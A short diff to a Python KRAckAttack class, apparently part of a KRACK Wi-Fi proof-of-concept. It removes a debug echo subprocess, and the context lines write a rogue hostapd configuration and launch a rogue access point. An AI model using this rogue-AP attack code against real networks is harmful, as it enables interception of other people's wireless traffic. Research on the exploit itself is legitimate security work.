@@ -931,16 +931,12 @@ class KRAckAttack():
 		with open("/root/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
 
-		p = subprocess.Popen(["echo", "Welcome"], stdout=subprocess.PIPE)
-		print (p.communicate()[0])
-
 		self.hostapd = subprocess.Popen("hostapd /root/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -d", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(10)
 
-		p.terminate()
 		# when domain name (encode) to idna, label empty or too long error, 
 		# that is because domain name uses "." to split label,
 		# every label limited to longest 63 characters or no empty.
